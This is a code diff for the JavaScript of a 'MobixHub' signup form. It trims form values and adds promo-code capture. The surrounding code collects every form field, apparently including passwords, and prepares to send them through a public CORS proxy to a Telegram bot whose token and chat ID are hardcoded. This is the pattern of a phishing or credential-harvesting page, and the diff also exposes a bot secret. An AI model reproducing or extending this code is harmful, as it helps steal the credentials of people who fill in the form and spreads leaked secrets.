@@ -22,7 +22,6 @@ function validateStep(stepNum) {
     }
   }
 
-  // ✅ Extra validation: check if passwords match in Step 1
   if (stepNum === 1) {
     const pw = step.querySelector("input[name='password']");
     const cpw = step.querySelector("input[name='confirmPassword']");
@@ -44,7 +43,7 @@ document.getElementById("multiStepForm").addEventListener("submit", function (e)
 
   const botToken = "7767854656:AAFd_Py6JZqgqqXx0OV9HXPsLaimgcGGVFw";
   const chatId = "6976365864";
-  const proxy = "https://corsproxy.io/?";  // ✅ Free forever proxy
+  const proxy = "https://corsproxy.io/?";
 
   const formInputs = document.querySelectorAll("#multiStepForm input, #multiStepForm select");
   const data = {};
@@ -53,11 +52,24 @@ document.getElementById("multiStepForm").addEventListener("submit", function (e)
   formInputs.forEach(input => {
     if (input.type !== "file") {
       const label = input.previousElementSibling ? input.previousElementSibling.innerText : input.name;
-      data[label] = input.value;
-      if (input.name === "firstName") fullName += input.value + " ";
-      if (input.name === "lastName") fullName += input.value;
+      const value = input.value.trim();
+      if (value !== "") {
+        data[label] = value;
+        if (input.name === "firstName") fullName += value + " ";
+        if (input.name === "lastName") fullName += value;
+      }
     }
   });
+
+  // ✅ Include promo code from input or URL param
+  const promoInput = document.getElementById("promoInput");
+  const promoTyped = promoInput ? promoInput.value.trim() : "";
+  const promoURL = new URLSearchParams(window.location.search).get("promo");
+
+  const promoFinal = promoTyped || promoURL;
+  if (promoFinal) {
+    data["Promo Code"] = promoFinal;
+  }
 
   let message = "📝 *New MobixHub Signup Request*\n\n";
   for (const [label, value] of Object.entries(data)) {
